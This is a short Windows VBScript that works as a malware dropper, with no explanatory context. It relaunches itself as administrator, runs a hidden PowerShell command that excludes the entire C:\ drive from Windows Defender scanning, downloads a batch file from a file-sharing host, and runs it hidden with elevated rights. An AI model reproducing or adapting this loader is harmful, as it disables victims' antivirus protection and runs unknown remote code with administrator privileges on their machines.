If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1: WScript.Quit
End If

CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\\'", 0, True

With CreateObject("MSXML2.XMLHTTP")
    .Open "GET", "https://files.catbox.moe/u6tm9d.bat", False: .Send
    If .Status = 200 Then
        With CreateObject("ADODB.Stream"): .Open: .Type = 1: .Write .ResponseBody: .SaveToFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) & "murgan.bat", 2: .Close: End With
    End If
End With

CreateObject("Shell.Application").ShellExecute "cmd.exe", "/c " & Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) & "murgan.bat", "", "runas", 0
